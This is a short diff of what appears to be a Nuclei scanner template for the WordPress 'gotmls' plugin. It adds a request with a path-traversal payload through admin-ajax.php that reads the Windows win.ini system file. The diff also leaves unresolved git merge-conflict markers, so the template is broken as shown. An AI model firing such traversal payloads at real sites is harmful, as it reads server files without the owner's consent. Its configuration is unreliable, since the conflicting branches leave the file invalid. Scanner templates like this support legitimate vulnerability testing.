@@ -8,6 +8,7 @@ info:
   tags: wordpress,wp-plugin,gotmls
 
 requests:
+<<<<<<< HEAD
   - payloads:
       Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
     attack: sniper
@@ -21,6 +22,12 @@ requests:
         Accept-Encoding: gzip, deflate
         Accept: */*
         
+=======
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-admin/admin-ajax.php?action={{randstr}}&file=../../../../../../../../../Windows/win.ini"
+
+>>>>>>> 5d36d276 (add new stuff)
     matchers-condition: and
     matchers:
       - type: word
